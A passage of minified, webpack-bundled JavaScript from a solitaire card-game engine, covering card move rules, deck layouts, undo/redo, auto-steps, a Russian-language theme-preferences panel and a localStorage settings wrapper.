t&&t.down<t.up},descent:function(e){if(0==e.cards.length)return!0;var t=c._downupranknum(e);return t&&t.down>t.up},descentOne:function(e){if(0==e.cards.length)return!0;var t=c._downupranknum(e);return t&&t.down==1+t.up},ascendOne:function(e){if(0==e.cards.length)return!0;var t=c._downupranknum(e);return t&&1+t.down==t.up},ascdescOne:function(e){if(0==e.cards.length)return!0;var t=c._downupranknum(e);return t&&1==Math.abs(t.down-t.up)},sum14:function(e){if(0==e.cards.length)return!0;var t=c._downupcards(e),a=t.down.value+t.up.value;return 14==a},around:function(e){if(0==e.cards.length)return!0;var t=e.from.deck.getRelationsByName("around",{from:null}),a=l["default"].getDeckById(e.cards[0].parent);for(var n in t)if(t[n].to==a.name)return!0;return!1}};t["default"]=c},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=e.getRelationsByName("beside",{from:null,type:"prev"})[0],a=e.getRelationsByName("beside",{from:null,type:"next"})[0];return{prev:t,next:a}}},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]={not:function(e){return!1},notFirst:function(e){return e.cardIndex>0},any:function(e){return!0},onlytop:function(e){return e.cardIndex==e.deckLength-1}}},function(t,n,i){"use strict";function r(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(n,"__esModule",{value:!0});var d=i(3),u=r(d),o=i(5),l=r(o),s=i(11),f=r(s),c=i(6),p=r(c),v=i(14),h=r(v),m={deckLength:function(e){return u["default"].card.ranks.length<=a.deck.cards.length},not:function(){return!1},noMoves:function(e){return!p["default"].checkFrom(e.name)},_top:function(t){var a=e.getTopCard();return a&&l["default"].validateCardName(a).rank},topAce:function(e){return"1"==m._top()},topKing:function(e){return"k"==m._top()},_prev_next_desc_ask:function(e,t,n){for(var i=!0,r=(0,h["default"])(a.to)[t],d=e.getTopCard();r&&i;){var u=f["default"].Deck(r);_card=u.getTopCard(),i=i&&_card&&n(l["default"].validateCardName(d).value,0|l["default"].validateCardName(_card).value),d=_card,r=(0,h["default"])(u)[t]}return i},prevDescOne:function(e){return m._prev_next_desc_ask(e,"prev",function(e,t){return e==(0|t)+1})},prevAscOne:function(e){return m._prev_next_desc_ask(e,"prev",function(e,t){return(0|e)+1==t})},nextDescOne:function(e){return m._prev_next_desc_ask(e,"next",function(e,t){return e==(0|t)+1})},nextAscOne:function(e){return m._prev_next_desc_ask(e,"next",function(e,t){return(0|e)+1==t})},prevDesc:function(){return m._prev_next_desc_ask(e,"prev",function(e,t){return e>t})},prevAsc:function(){return m._prev_next_desc_ask(e,"prev",function(e,t){return e<t})},nextDesc:function(){return m._prev_next_desc_ask(e,"next",function(e,t){return e>t})},nextAsc:function(){return m._prev_next_desc_ask(e,"next",function(e,t){return e<t})}};n["default"]=m},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]={none:function(e,t,a,n,i){return{x:e.x,y:e.y}},last_three_min:function(e,t,a,n,i){return a>n-3?n>3?{x:e.x-2*(n-3-a),y:e.y-(n-3-a)}:{x:e.x+2*a,y:e.y+(0|a)}:{x:x,y:y}},twindeck_typeA:function(e,t,a,n,i){var r=24,d=3,u={x:2,y:1},o=n/r*d|0;o>=d&&(o=d-1);var l=a-(n-o-1);return l<0&&(l=0),{x:e.x+u.x*l,y:e.y+u.y*l}},radial:function(e,t,a,n,i){var r=1,d=a*r,u=e.rotate,o=Math.PI/180,l=Math.sin(u*o)*d,s=Math.cos(u*o)*d;
return{x:e.x+l,y:e.y-s}},special:function(e,t,a,n,i){for(var r=e.y,d=e.x,u=0;u<a;u+=1)r+=i[u]&&i[u].flip?e.flip_padding_y:e.padding_y,d+=i[u]&&i[u].flip?e.flip_padding_x:e.padding_x;return{x:d,y:r}},vertical:function(e,t,a,n,i){for(var r=e.y,d=0;d<a;d+=1)r+=i[d]&&i[d].flip?e.flip_padding_y:e.padding_y;var u={x:e.x,y:r};return u},horizontal:function(e,t,a,n,i){for(var r=e.x,d=0;d<a;d+=1)r+=i[d]&&i[d].flip?e.flip_padding_x:e.padding_x;var u={x:r,y:e.y};return u}}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(2),r=n(i),d=a(1),u=(n(d),a(3)),o=(n(u),a(5)),l=n(o),s=a(19),f=n(s),c=a(20),p=n(c),v=a(23),h=n(v),m=a(24),y=n(m),g={twindeck:f["default"],dealerdeck:p["default"],kick:h["default"],stepsAround:y["default"]},k=[],_=[],x=function(e){r["default"].listen(e,function(t){for(var a in k)if(k[a].event==e){var n=k[a].action,i="click"!=e||t.name==k[a].deck.name;i&&g[n].call(k[a].deck,{actionData:k[a].deck.actions[n],eventData:t,eventName:e})}})},b=function(){for(var e in this.actions)this.actions[e].event||(this.actions[e].event="click"),g[e]&&(k.push({deck:this,event:this.actions[e].event,action:e}),_.indexOf(this.actions[e].event)<0&&(_.push(this.actions[e].event),x(this.actions[e].event)));w(this.actions)},w=function(e){l["default"].animationDefault();for(var t in e.actions)e.actions[t].autorun&&g[t]&&g[t].call(e,{actionData:e.actions[t],eventData:null,eventName:e.actions[t].event})};t["default"]={addActions:b}},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){if(0==this.cards.length)return void r["default"].dispatch("makeStep",p["default"].get());var t=[];if(e.actionData.toGroup&&!e.actionData.to&&(e.actionData.to=e.actionData.toGroup),e.actionData.to)if("string"==typeof e.actionData.to){var a=l["default"].getElementsByName(e.actionData.to);for(var n in a){if("group"==a[n].type)for(var i in a[n].decks)t.push(a[n].decks[i]);"deck"==a[n].type&&t.push(_el)}}else for(var n in e.actionData.to){var a=l["default"].getElementsByName(e.actionData.to[n]);for(var d in a){if("group"==a[d].type)for(var i in a[d].decks)t.push(a[d].decks[i]);"deck"==a[d].type&&t.push(a[d])}}l["default"].animationDefault();var u=!1;for(var o in t){var s=this.getTopCard();0==t[o].cards.length&&e.actionData.onlyEmpty;var c=!e.actionData.onlyEmpty||0==t[o].cards.length;if(c&&s){u=!0;var v=s.name;(0,f["default"])({from:this.name,to:t[o].name,deck:[v],flip:!0},!0),t[o].flipCheck(),p["default"].add({move:{from:this.name,to:t[o].name,deck:[v],flip:!0}})}}u&&r["default"].dispatch("makeStep",p["default"].get()),e.actionData.dispatch&&r["default"].dispatch(e.actionData.dispatch,!u)};var i=a(2),r=n(i),d=a(1),u=(n(d),a(3)),o=(n(u),a(5)),l=n(o),s=a(21),f=n(s),c=a(22),p=n(c)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){if(e.from&&e.to&&e.deck&&e.deck.length){var t="string"==typeof e.from?l["default"].Deck(e.from):e.from,a="string"==typeof e.to?l["default"].Deck(e.to):e.to;if(t&&a&&"deck"==t.type&&"deck"==a.type){var n=!0,i=t.cards;for(var d in i)if(d>=i.length-e.deck.length){var u=d-(0|i.length)+(0|e.deck.length);e.deck[u]&&i[d].name!=e.deck[u]&&(n=!1)}if(n){var o=t.Pop(e.deck.length);if(e.flip)for(var s in o)o[s].flip=!o[s].flip;a.Push(o);var f=[];for(var c in o)f.push({card:o[c]});var p={departure:t,destination:a,moveDeck:f};"function"==typeof e.callback&&(p.callback=e.callback),r["default"].dispatch("moveDragDeck",p)}}}};var i=a(2),r=n(i),d=a(1),u=(n(d),a(5)),o=(n(u),a(11)),l=n(o),s=a(6);n(s)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(2),r=n(i),d=a(1),u=(n(d),a(21)),o=n(u),l=a(11),s=(n(l),a(6)),f=n(s),c=[],p={},v={},h=function(e){for(var t in p)p[t](e);void 0!==e.move&&void 0!==e.move.from&&void 0!==e.move.to&&void 0!==e.move.deck&&(0,o["default"])({from:e.move.to,to:e.move.from,deck:e.move.deck,flip:e.move.flip})};r["default"].listen("undo",function(e){if(r["default"].dispatch("stopAnimations"),e){if(e instanceof Array){e.reverse();for(var t in e){var a=e[t];h(a)}}else h(e);f["default"].checkTips()}});var m=function(e){for(var t in v)v[t](e);void 0!==e.move&&void 0!==e.move.from&&void 0!==e.move.to&&void 0!==e.move.deck&&(0,o["default"])(e.move)};r["default"].listen("redo",function(e){if(r["default"].dispatch("stopAnimations"),e){if(e instanceof Array){e.reverse();for(var t in e){var a=e[t];m(a)}}else m(e);f["default"].checkTips()}}),t["default"]=new function(){this.reset=function(){c=[]},this.add=function(e){c.push(e)},this.get=function(){var e=c;return this.reset(),e},this.addUndoMethods=function(e){for(var t in e)p[t]=e[t]},this.addRedoMethods=function(e){for(var t in e)v[t]=e[t]}}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){if(window._debug_time=(new Date).getTime(),u["default"].get("stepType")!=f["default"].stepType)return!1;var t=null;if(e.eventData[0]&&e.eventData[0].move&&"string"==typeof e.eventData[0].move.to&&(t=e.eventData[0].move.to),e.eventData.to&&"string"==typeof e.eventData.to&&(t=e.eventData.to),e.eventData.to&&"string"!=typeof e.eventData.to&&"string"==typeof e.eventData.to.name&&(t=e.eventData.to.name),t!=this.name)return!1;l["default"].animationDefault();var a=y["default"].Deck(t),n=a.getCardsNames(),i={from:a,to:e.actionData.to,deck:n,flip:!0};"function"==typeof e.eventData.callback&&(i.callback=e.eventData.callback),(0,p["default"])(i),h["default"].add({move:{from:a.name,to:e.actionData.to,deck:n,flip:!0}}),e.actionData.dispatch&&r["default"].dispatch(e.actionData.dispatch)};var i=a(2),r=n(i),d=a(1),u=n(d),o=a(5),l=n(o),s=a(3),f=n(s),c=a(21),p=n(c),v=a(22),h=n(v),m=a(11),y=n(m)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=this,a=u["default"].get("stepType");if(a==f["default"].stepType){u["default"].set("stepType","stepsAround"),l["default"].curLock();var n=this.getRelationsByName("around",{from:null});p["default"].getTips();"string"==typeof e.actionData.action,"string"==typeof e.actionData.run?!function(){var a="boolean"!=typeof e.actionData.central||e.actionData.central,i=[];for(var d in n)p["default"].fromTo(t.name,n[d].to)&&i.push(n[d]);var u=i.length,o=function(){u-=1,0===u&&(h(),e.actionData.dispatch&&r["default"].dispatch(e.actionData.dispatch,e.eventData))};0===u?h():a&&(u+=1,r["default"].dispatch(e.actionData.run,{to:t.name,callback:o}));for(var l in i){var s=Object.assign({},i[l]);s.callback=o,r["default"].dispatch(e.actionData.run,s)}}():(h(),e.actionData.dispatch&&r["default"].dispatch(e.actionData.dispatch,e.eventData))}};var i=a(2),r=n(i),d=a(1),u=n(d),o=a(5),l=n(o),s=a(3),f=n(s),c=a(6),p=n(c),v=a(11),h=(n(v),function(){u["default"].set("stepType",f["default"].stepType),l["default"].curUnLock()})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=!0;//!common.isLock();
t=t&&!this.locked,"boolean"==typeof this.fill&&(t=t&&!this.fill);var a=-1,n=null,i=null,r=null,u=this.cards.length,l=[];for(var f in this.cards){if(this.cards[f].id==e){a=0|f,n=this.cards[f].name;var c=o["default"].validateCardName(n);t=t&&c,c&&(i=c.suit,r=c.rank),t=t&&(!this.cards[f].flip||this.cards[f].flip==d["default"].canMoveFlip)}a>=0&&l.push({index:f,card:this.cards[f]})}var p={cardId:e,cardName:n,cardSuit:i,cardRank:r,cardIndex:a,deckLength:u};for(var v in this.takeRules){var h=this.takeRules[v];t=!!s["default"][h]&&(t&&s["default"][h](p))}return t=t&&a>=0,t&&l};var i=a(1),r=(n(i),a(3)),d=n(r),u=a(5),o=n(u),l=a(15),s=n(l)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=r["default"].get("stepType"),a=!0,n=e[0].card.parent,i=f["default"].getDeckById(n);if(a=a&&!this.locked,t!=u["default"].stepType){var d=(0,l["default"])();a=!!(a&&d.autoSteps&&d.autoSteps[t])&&d.autoSteps[t].manual({putDeck:e,to:this})}else{var o=null,s=this;for(var c in this.putRules)if(a){o&&(s=f["default"].Deck(o));var v=this.putRules[c];if(p["default"][v]){var h={from:{deckId:n,deck:i},putDeck:e,cards:s.cards,to:s,link:o};a=a&&p["default"][v](h),o=h.link}else a=!1}}return a};var i=a(1),r=n(i),d=a(3),u=n(d),o=a(9),l=n(o),s=a(11),f=n(s),c=a(13),p=n(c)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=l["default"].validateCardName(e);if(t){var a="card_"+l["default"].genId(),n={id:a,name:e,type:"card",visible:!0,flip:!1};n.parent=this.getId(),r["default"].dispatch("addCardEl",n);var i=u["default"].get("elements");return i[a]=n,u["default"].set("elements",i),this.Push([n]),this.flipCheck(),this.Redraw(),n}return!1};var i=a(2),r=n(i),d=a(1),u=n(d),o=a(5),l=n(o)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t={},a=r["default"].get("elements");for(var n in a)"deck"==a[n].type&&(e&&e.visible?a[n].visible&&(t[n]=a[n]):t[n]=a[n]);return t};var i=a(1),r=n(i)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=r["default"].get("elements");for(var a in t)if("deck"==t[a].type&&a==e)return t[a];return null};var i=a(1),r=n(i)},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=[];for(var a in e)e[a].card&&e[a].card.name?t.push(e[a].card.name):e[a].name&&t.push(e[a].name);return t}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e,t){var a=r["default"].getElementsByName(e,"deck");if(t&&"string"==typeof t){for(var n in a){var i=r["default"].getElementById(a[n].parent());if(i&&i.name&&i.name==t)return a[n]}return!1}return a[0]};var i=a(5),r=n(i)},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=[],a=0;for(var n in this.decks)a+=1,t.push(null);for(var n in this.decks)this.decks[n].groupIndex&&this.decks[n].groupIndex<=a&&(t[this.decks[n].groupIndex-1]=!0);for(var n in this.decks)if(!this.decks[n].groupIndex){for(var i=0;null!=t[i];i+=1);t[i]=this.decks[n].getId()}for(var n in this.decks)this.decks[n].groupIndex&&this.decks[n].groupIndex<=a&&(t[this.decks[n].groupIndex-1]=this.decks[n].getId());var r={};for(var n in this.decks)this.decks[n].groupIndex&&this.decks[n].groupIndex>a&&(r[this.decks[n].groupIndex-1]=this.decks[n].getId());for(var n in r){for(var i=0;null!=t[i];i+=1);t[i]=this.decks[r[n]].getId()}var d=!0;for(var n in e)d=d&&"string"==typeof e[n];if(d)for(var n in e){var i=t[n%t.length];this.decks[i].genCardByName(e[n])}else for(var n in e)n<t.length&&this.decks[t[n]].Fill(e[n])}},function(e,t,n){"use strict";function i(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=this.getDecks();void 0!==e.decks&&"number"!=typeof e.decks||(e.decks=[]);for(var n in t){if(e.decks[n]||(e.decks[n]={}),e.position&&e.decks[n].parentPosition&&(e.decks[n].parentPosition={x:e.position.x,y:e.position.y}),e.rotate&&(e.decks[n].rotate=e.rotate),e.paddingX&&(e.decks[n].paddingX=e.paddingX),e.paddingY&&(e.decks[n].paddingY=e.paddingY),e.flipPaddingX&&(e.decks[n].flipPaddingX=e.flipPaddingX),e.flipPaddingY&&(e.decks[n].flipPaddingY=e.flipPaddingY),e.decks[n].position||(e.decks[n].position={}),e.decks[n].parentPosition||(e.decks[n].parentPosition={}),!e.decks[n].parentPosition.x&&a.position&&a.position.x&&"number"==typeof a.position.x&&(e.decks[n].parentPosition.x=e.position.x),!e.decks[n].parentPosition.y&&a.position&&a.position.y&&"number"==typeof a.position.y&&(e.decks[n].parentPosition.y=e.position.y),e.placement){var i=d["default"].card;e.placement.x&&(e.decks[n].position.x=(e.placement.x+i.width)*n),e.placement.y&&(e.decks[n].position.y=(e.placement.y+i.height)*n)}!e.decks[n].rotate&&e.rotate&&"number"==typeof e.rotate&&(e.decks[n].rotate=e.rotate),!e.decks[n].paddingX&&e.paddingX&&"number"==typeof e.paddingX&&(e.decks[n].paddingX=e.paddingX),!e.decks[n].paddingY&&e.paddingY&&"number"==typeof e.paddingY&&(e.decks[n].paddingY=e.paddingY),!e.decks[n].flipPaddingX&&e.flipPaddingX&&"number"==typeof e.flipPaddingX&&(e.decks[n].flipPaddingX=e.flipPaddingX),!e.decks[n].flipPaddingY&&e.flipPaddingY&&"number"==typeof e.flipPaddingY&&(e.decks[n].flipPaddingY=e.flipPaddingY),t[n].Redraw(e.decks[n])}};var r=n(3),d=i(r)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(35),r=n(i),d=a(36),u=n(d),o=a(37),l=n(o),s=a(44),f=n(s);t["default"]={count:r["default"],fan:u["default"],map:l["default"],line:f["default"]}},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){for(var t=e.count,a=[],n=0;n<t;n+=1){var i=this.name+"_deck"+(n+1);a.push({name:i})}return a}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){this.placement={x:0,y:0};for(var t=[],a="number"==typeof e.count?e.count:3,n=180/a,i="number"==typeof e.radius?e.radius:100,d=void 0!==e.center&&void 0!==e.center.x&&void 0!==e.center.y?e.center:{x:0,y:0},u=n/2+270,o=Math.PI/180,l=0;l<a;l+=1){var s=Math.sin(u*o)*i,f=Math.cos(u*o)*i;u>360&&(u-=360),t.push({name:this.name+"_deck"+l,rotate:u,position:{x:d.x+s-r["default"].card.width/2,y:d.y-f-r["default"].card.height/2}}),u+=n}return t};var i=a(3),r=n(i)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){var t=[],a={x:0,y:0},n=this.placement?{x:void 0!==this.placement.x?this.placement.x:a.x,y:void 0!==this.placement.y?this.placement.y:a.y}:a;this.placement={x:0,y:0};var i=1,d=l["default"].mapSize(e.map);for(var o in e.map)for(var s in e.map[o])("boolean"==typeof e.map[o][s]&&e.map[o][s]||"number"==typeof e.map[o][s]&&e.map[o][s]>0)&&(e.map[o][s]={}),"string"==typeof e.map[o][s]?e.map[o][s]={name:e.map[o][s]}:e.map[o][s]&&void 0!==e.map[o][s]&&"string"!=typeof e.map[o][s].name&&(e.map[o][s].name=this.name+"_deck_"+s+"_"+o);for(var f in e.map)for(var c in e.map[f]){var s=0|c,o=0|f,p=e.map[o][s];if(p){var v={name:e.map[o][s].name,position:{x:s*((0|r["default"].card.width)+(0|n.x)),y:o*((0|r["default"].card.height)+(0|n.y))}},h=[],m={around:"mapAroundRelations",beside:"mapBesideRelations",fall:"mapFallRelations"};if(e.relations)for(var y in m)e.relations[y]&&(h=h.concat(u["default"][m[y]]({x:s,y:o,map:e.map,mapSize:d,el:p,data:e.relations[y]})));v.relations=h,t.push(v),i+=1}}return t};var i=a(3),r=n(i),d=a(38),u=n(d),o=a(40),l=n(o)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(39),r=n(i),d=a(41),u=n(d),o=a(42),l=n(o),s=a(43),f=n(s);t["default"]={mapFallRelations:r["default"],mapAroundRelations:u["default"],mapBesideRelations:l["default"],lineBesideRelations:f["default"]}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(40),r=n(i),d=[{left:"right"},{right:"left"},{up:"down"},{down:"up"}];t["default"]=function(e){var t=[],a=[];for(var n in e.data.directions)a.indexOf(e.data.directions[n])<0&&a.indexOf(d[e.data.directions[n]])<0&&a.push(e.data.directions[n]);for(var i in a)switch(a[i]){case"left":var u=(0|e.x)+r["default"].beSide.left.x,o=(0|e.y)+r["default"].beSide.left.y;r["default"].exist(u,o,e.mapSize,e.map)&&t.push({name:"fall",direction:"left",to:e.map[o][u].name});break;case"right":var u=(0|e.x)+r["default"].beSide.right.x,o=(0|e.y)+r["default"].beSide.right.y;r["default"].exist(u,o,e.mapSize,e.map)&&t.push({name:"fall",direction:"right",to:e.map[o][u].name});break;case"up":var u=(0|e.x)+r["default"].beSide.up.x,o=(0|e.y)+r["default"].beSide.up.y;r["default"].exist(u,o,e.mapSize,e.map)&&t.push({name:"fall",direction:"up",to:e.map[o][u].name});break;case"down":var u=(0|e.x)+r["default"].beSide.down.x,o=(0|e.y)+r["default"].beSide.down.y;r["default"].exist(u,o,e.mapSize,e.map)&&t.push({name:"fall",direction:"down",to:e.map[o][u].name})}return t}},function(e,t){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var a={left:{x:-1,y:0},right:{x:1,y:0},up:{x:0,y:-1},down:{x:0,y:1}},n=function(e,t,a){return e>=0&&t>=0&&e<a.width&&t<a.height},i=function(e,t,a,i){return n(e,t,a)&&i[t][e]},r=function(e){var t={width:e[0].length,height:e.length};return e.forEach(function(e){t.width=Math.max(t.width,e.length)}),t},d=[{x:-1,y:-1,type:"corn",id:"clt"},{x:0,y:-1,type:"side",id:"top"},{x:1,y:-1,type:"corn",id:"crt"},{x:-1,y:0,type:"side",id:"lft"},{x:1,y:0,type:"side",id:"rgt"},{x:-1,y:1,type:"corn",id:"clb"},{x:0,y:1,type:"side",id:"btm"},{x:1,y:1,type:"corn",id:"crb"}];t["default"]={beSide:a,mapSize:r,inMap:n,aroundRelations:d,exist:i}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(40),r=n(i);t["default"]=function(e){var t=[];for(var a in r["default"].aroundRelations)r["default"].inMap(e.x+r["default"].aroundRelations[a].x,e.y+r["default"].aroundRelations[a].y,e.mapSize)&&e.map[e.y+r["default"].aroundRelations[a].y][e.x+r["default"].aroundRelations[a].x]&&t.push({name:"around",type:r["default"].aroundRelations[a].type,id:r["default"].aroundRelations[a].id,to:e.map[e.y+r["default"].aroundRelations[a].y][e.x+r["default"].aroundRelations[a].x].name});return t}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(40);n(i);t["default"]=function(e){var t=[];return t}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(40);n(i);t["default"]=function(e){var t=[],a=e.deckIndex>0?e.decks[(0|e.deckIndex)-1].name:null;a&&t.push({name:"beside",type:"prev",to:a});var n=e.deckIndex<e.count-1?e.decks[(0|e.deckIndex)+1].name:null;return n&&t.push({name:"beside",type:"next",to:n}),t}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=function(e){for(var t=e.count,a=[],n=0;n<t;n+=1){var i=this.name+"_deck"+(n+1),d={name:i};a.push(d)}if(e.first){var u=a[0];for(var o in e.first)u[o]=e.first[o]}if(e.last){var l=a[a.length-1];for(var s in e.first)l[s]=e.first[s]}for(var f in a){var c=[],p={beside:"lineBesideRelations"};if(e.relations)for(var v in p)e.relations[v]&&(c=c.concat(r["default"][p[v]]({deckIndex:f,count:t,decks:a,data:e.relations[v]})));a[f].relations=c}return a};var i=a(38),r=n(i)},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(46),r=n(i),d={fallAutoStep:r["default"]};t["default"]=function(e){var t={};for(var a in e)if(d[a]){var n=new d[a](e[a]);n.init(a),t[a]=n}return t}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function r(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}function d(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}Object.defineProperty(t,"__esModule",{value:!0});var u=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),o=a(1),l=n(o),s=a(3),f=n(s),c=a(2),p=(n(c),a(47)),v=n(p),h=a(11),m=n(h),y=a(6),g=n(y),k=function(e){function t(e){return i(this,t),r(this,Object.getPrototypeOf(t).call(this,e))}return d(t,e),u(t,[{key:"check",value:function(){g["default"].checkTips();var e=g["default"].getTips();0===e.length&&(l["default"].set("stepType",f["default"].stepType),this.end())}},{key:"auto",value:function(){}},{key:"manual",value:function(e){var t=m["default"].getDeckById(e.putDeck[0].card.parent),a=e.to,n=t.getRelationsByName("fall",{from:null});for(var i in n)if(n[i].to==a.name&&0===a.cardsCount())return!0;return!1}}]),t}(v["default"]);t["default"]=k},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(t,"__esModule",{value:!0});var r=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),d=a(2),u=n(d),o=a(1),l=n(o),s=a(5),f=(n(s),function(){function e(t){i(this,e),void 0!==t.groups&&(this.groups=t.groups),"string"==typeof t.event&&(this.event=t.event),"string"==typeof t.dispatch&&(this.dispatch=t.dispatch),"boolean"==typeof t.autoStep&&(this.autoStep=t.autoStep)}return r(e,[{key:"start",value:function(){l["default"].set("stepType",this.stepType),this.autoStep?this.auto():this.check()}},{key:"end",value:function(){this.dispatch&&u["default"].dispatch(this.dispatch)}},{key:"init",value:function(e){var t=this;this.stepType=e,this.event&&u["default"].listen(this.event,function(){t.start()}),this.autoStep||u["default"].listen("moveEnd",function(){t.check()})}}]),e}());t["default"]=f},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(3);n(i);t["default"]=function(){var e=a(49);$("#gpCommit").parent().before(e)}},function(e,t){e.exports="<div id=solitaire-engine-style-preferences> <h4>Настройки оформления</h4> <div> <span class=solitaire-engine-style-preferences-label>Фон:</span> <label> <input type=radio name=pref_field value=default_field> Классический </label> <label> <input type=radio name=pref_field value=alternative_field> Альтернативный </label> </div> <div> <span class=solitaire-engine-style-preferences-label>Лицевая сторона:</span> <label> <input type=radio name=pref_face value=default_face> Классическая </label> <label> <input type=radio name=pref_face value=alternative_face> Англо-американская </label> </div> <div> <span class=solitaire-engine-style-preferences-label>Рубашка:</span> <label> <input type=radio name=pref_back value=default_back> Классическая </label> <label> <input type=radio name=pref_back value=alternative_back> Альтернативная </label> </div> </div>"},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(2),r=n(i),d=a(3),u=n(d),o=a(51),l=n(o),s=function(){var e=l["default"].get("pref");!e&&(e=u["default"].pref);for(var t in u["default"].themes){var a=e[t]?e[t]:u["default"].pref[t];$("input[name='pref_"+t+"'][value='"+a+"']").prop({checked:!0})}},f=function(){var e={};for(var t in u["default"].themes)e[t]=$("input[name='pref_"+t+"']:checked").val();r["default"].dispatch("fieldThemesSet",e),c(e)},c=function(e){l["default"].set("pref",e)};t["default"]=function(){$("#bbParameters").click(s),$("#solitaire-engine-style-preferences input").change(f)}},function(e,t){"use strict";function a(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),i=function(){function e(){a(this,e);try{localStorage.hasOwnProperty("SolitaireEngine")||(localStorage.SolitaireEngine="{}")}catch(t){}}return n(e,[{key:"set",value:function(e,t){try{var a=JSON.parse(localStorage.SolitaireEngine);a[e]=t,localStorage.SolitaireEngine=JSON.stringify(a)}catch(n){}}},{key:"get",value:function(e){try{var t=JSON.parse(localStorage.SolitaireEngine);return t[e]}catch(a){return null}}},{key:"clear",value:function(){try{localStorage.SolitaireEngine="{}"}catch(e){}}}]),e}();t["default"]=new i},function(e,t,a){"use strict";function n(e){return 